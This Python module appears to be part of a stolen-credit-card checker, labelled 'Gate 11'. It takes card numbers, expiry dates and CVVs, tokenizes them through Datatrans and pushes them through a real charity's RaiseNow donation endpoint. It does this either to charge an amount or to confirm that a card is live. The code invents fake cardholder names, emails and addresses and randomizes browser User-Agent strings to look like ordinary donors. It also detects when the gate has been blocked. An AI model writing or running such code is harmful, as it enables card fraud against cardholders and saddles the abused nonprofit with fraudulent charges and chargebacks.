import random
import string
import json
import logging
import time

# List of country codes for random selection
COUNTRY_CODES = [
    'CH', 'DE', 'AT', 'IT', 'FR', 'AF', 'AL', 'DZ', 'AS', 'AD', 'AO', 'AI', 'AQ', 'AG', 'AR', 'AM', 'AW', 'AZ', 'AU', 'BS', 
    'BH', 'BD', 'BB', 'BY', 'BE', 'BZ', 'BJ', 'BM', 'BT', 'BO', 'BA', 'BW', 'BV', 'BR', 'IO', 'BG', 'BF', 'BI', 'CL', 'CN', 
    'CO', 'CK', 'CR', 'DJ', 'DM', 'DO', 'DK', 'SV', 'CI', 'EC', 'ER', 'EE', 'FK', 'FJ', 'FI', 'TF', 'GF', 'PF', 'FO', 'GA', 
    'GM', 'GE', 'GH', 'GI', 'GD', 'GR', 'GB', 'GL', 'GP', 'GU', 'GT', 'GG', 'GN', 'GW', 'GY', 'HT', 'HM', 'HN', 'HK', 'IN', 
    'ID', 'IM', 'IQ', 'IR', 'IE', 'IS', 'IL', 'JM', 'JP', 'JE', 'JO', 'VG', 'VI', 'KY', 'KH', 'CM', 'CA', 'CV', 'KZ', 'QA', 
    'KE', 'KG', 'KI', 'CC', 'KM', 'CG', 'CD', 'XK', 'HR', 'CU', 'KW', 'LA', 'LS', 'LV', 'LB', 'LR', 'LI', 'LT', 'LU', 'LY', 
    'MO', 'MG', 'MW', 'MY', 'MV', 'ML', 'MT', 'MA', 'MH', 'MQ', 'MR', 'MU', 'YT', 'MK', 'MX', 'FM', 'MD', 'MC', 'MN', 'ME', 
    'MS', 'MZ', 'MM', 'NA', 'NR', 'NP', 'NC', 'NZ', 'NI', 'NL', 'NE', 'NG', 'NU', 'KP', 'MP', 'NF', 'NO', 'OM', 'PK', 'PW', 
    'PS', 'PA', 'PG', 'PY', 'PE', 'PH', 'PN', 'PL', 'PT', 'PR', 'RW', 'RO', 'RU', 'RE', 'KN', 'MF', 'SB', 'ZM', 'WS', 'SM', 
    'BL', 'SA', 'SE', 'SN', 'RS', 'SC', 'SL', 'ZW', 'SG', 'SK', 'SI', 'SO', 'ES', 'LK', 'SH', 'LC', 'PM', 'VC', 'SD', 'SR', 
    'SJ', 'SZ', 'SY', 'ST', 'GS', 'ZA', 'KR', 'TJ', 'TW', 'TZ', 'TH', 'TL', 'TG', 'TK', 'TO', 'TT', 'TD', 'CZ', 'TN', 'TM', 
    'TC', 'TV', 'TR', 'UG', 'UA', 'HU', 'UY', 'UZ', 'VU', 'VA', 'VE', 'AE', 'US', 'VN', 'WF', 'CX', 'BN', 'EH', 'YE', 'CF', 
    'CY', 'EG', 'GQ', 'ET', 'AX', 'UM', 'BQ', 'CW', 'SS', 'SX'
]

logger = logging.getLogger(__name__)

# --- HELPER FUNCTIONS FOR RANDOM DATA (SELF-CONTAINED) ---

def generate_random_string(length=8):
    """Generates a random string of characters."""
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

def random_email():
    """Generates a random email address."""
    prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8, 15)))
    domain = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))
    return f"{prefix}@{domain}.com"

def random_user_agent():
    """Generates a random realistic User-Agent string."""
    chrome_major = random.randint(100, 125)
    chrome_build = random.randint(0, 6500)
    chrome_patch = random.randint(0, 250)
    win_major = random.randint(10, 11)
    win_minor = random.randint(0, 3)
    win_build = random.randint(10000, 22631)
    win_patch = random.randint(0, 500)
    webkit_major = random.randint(537, 605)
    webkit_minor = random.randint(36, 99)
    safari_version = f"{webkit_major}.{webkit_minor}"
    chrome_version = f"{chrome_major}.0.{chrome_build}.{chrome_patch}"
    win_version = f"{win_major}.{win_minor}; Win64; x64"
    return (
        f"Mozilla/5.0 (Windows NT {win_version}) "
        f"AppleWebKit/{safari_version} (KHTML, like Gecko) "
        f"Chrome/{chrome_version} Safari/{safari_version}"
    )

# Wrapper function for making requests with retry logic, passed from main.py
def make_request_with_retry(session, method, url, max_retries=5, cancellation_event=None, **kwargs):
    last_exception = None
    for attempt in range(max_retries):
        if cancellation_event and cancellation_event.is_set():
            return None, "Operation cancelled by user"
        
        try:
            response = session.request(method, url, **kwargs)
            return response, None
        except Exception as e:
            last_exception = e
            wait_time = attempt + 1
            logger.warning(f"Attempt {attempt + 1}/{max_retries} for {url} failed: {e}. Retrying in {wait_time}s...")
            time.sleep(wait_time)
    
    final_error_message = f"Retry: All {max_retries} retry attempts for {url} failed. Last error: {last_exception}"
    logger.error(final_error_message)
    return None, final_error_message

# --- MAIN CHECKER FUNCTION FOR GATE 11 ---

def check_card_gate11(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate11_mode, _get_charge_value, custom_charge_amount=None):
    """Logic for Gate 11 - Charge or Live Check Mode V11"""
    gate11_mode = get_gate11_mode()

    try:
        user_agent = random_user_agent()
        
        # --- Step 1: Tokenize card ---
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://pay.datatrans.com",
            "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField",
            "User-Agent": user_agent,
            "X-Requested-With": "XMLHttpRequest"
        }
        tokenize_payload = {
            "mode": "TOKENIZE",
            "formId": "250808040558588645",
            "cardNumber": cc,
            "cvv": cvv,
            "paymentMethod": "ECA",
            "merchantId": "3000022877",
            "browserUserAgent": user_agent,
            "browserJavaEnabled": "false",
            "browserLanguage": "vi-VN",
            "browserColorDepth": "24",
            "browserScreenHeight": "1152",
            "browserScreenWidth": "2048",
            "browserTZ": "-420"
        }

        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Tokenize Error: {error}", bin_info
        if not token_response: return 'error', line, "HTTP Error with no response during Tokenization", bin_info

        # Handle specific decline from tokenization
        if "Card number not allowed in production" in token_response.text:
            return 'decline', line, 'CARD_NOT_ALLOWED_DECLINE', bin_info

        try:
            token_data = token_response.json()
            if "error" in token_data and "message" in token_data.get("error", {}):
                 return 'decline', line, token_data["error"]["message"], bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", "Unknown error at Tokenize"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"HTTP Error {token_response.status_code} during Tokenization", bin_info
            return 'error', line, "Tokenize response was not JSON", bin_info

        # --- Step 2: Make request based on mode ---
        
        # Random personal info as requested
        first_name = generate_random_string(random.randint(10, 15))
        last_name = generate_random_string(random.randint(10, 15))
        cardholder = f"{first_name} {last_name}"
        email = random_email()
        street = generate_random_string(random.randint(25, 30))
        postal_code = ''.join(random.choices(string.digits, k=5))
        city = generate_random_string(random.randint(20, 25))
        country = random.choice(COUNTRY_CODES)
        message_text = generate_random_string(random.randint(10, 30))

        payment_headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://donate.raisenow.io",
            "Referer": "https://donate.raisenow.io/",
            "User-Agent": user_agent
        }
        
        # Base payload structure
        payment_payload = {
            "account_uuid": "dc82362f-b3ba-4581-87e8-79f49eda26a9",
            "test_mode": False,
            "create_supporter": False,
            "supporter": {
                "locale": "en",
                "salutation": "ms",
                "first_name": first_name,
                "last_name": last_name,
                "email": email,
                "email_permission": False,
                "raisenow_parameters": {"integration": {"opt_in": {"email": False}}},
                "street": street,
                "postal_code": postal_code,
                "city": city,
                "country": country
            },
            "raisenow_parameters": {
                "analytics": {
                    "channel": "paylink",
                    "preselected_amount": "2000",
                    "suggested_amounts": "[2000,5000,10000]",
                    "user_agent": user_agent
                },
                "solution": {"uuid": "c60204c5-2c1b-47a2-ad3a-d852842eae1e", "name": "Page don - Site internet", "type": "donate"},
                "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/nptfc?lng=en", "uuid": "self-service", "version": "2.16.0"},
                "integration": {"message": message_text}
            },
            "custom_parameters": {"campaign_id": "Page donation - Website", "campaign_subid": ""},
            "payment_information": {
                "brand_code": "eca",
                "cardholder": cardholder,
                "expiry_month": mes.zfill(2),
                "expiry_year": ano,
                "transaction_id": transaction_id
            },
            "profile": "3da0f136-93dd-496d-a1db-688d7708259e",
            "return_url": "https://donate.raisenow.io/nptfc?lng=en&rnw-view=payment_result"
        }

        # --- CHARGE MODE ---
        if gate11_mode == 'charge':
            charge_value = _get_charge_value('11', custom_charge_amount)
            payment_url = "https://api.raisenow.io/payments" # Charge endpoint
            
            # Update amount for charge
            payment_payload["amount"] = {"currency": "CHF", "value": charge_value}
            # The subscription key is not needed for a one-time charge
            payment_payload.pop("subscription", None)

            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Error: {error}", bin_info
            if not payment_response: return 'error', line, "HTTP Error with no response during Payment", bin_info
            
            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            
            # Key check logic is the same as Gate 1
            if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
            elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
            elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info
        
        # --- LIVE CHECK MODE ---
        else: # 'live'
            payment_url = "https://api.raisenow.io/payment-sources" # Live check endpoint
            
            # Amount is still needed for source creation
            payment_payload["amount"] = {"currency": "CHF", "value": 50}
            # Add subscription key for live check
            payment_payload["subscription"] = { "recurring_interval": "6 * *", "timezone": "Asia/Bangkok" }

            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Source Error: {error}", bin_info
            if not payment_response: return 'error', line, "HTTP Error with no response during Payment Source", bin_info

            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            
            # Key check logic for live success
            if '"payment_source_status":"pending"' in response_text: return 'live_success', line, response_text, bin_info
            elif '"payment_status":"failed"' in response_text or '"payment_source_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info

    except Exception as e:
        logger.error(f"Unknown error in Gate 11 for line '{line}': {e}", exc_info=True)
        return 'error', line, f"Gate 11 System Error: {e}", bin_info
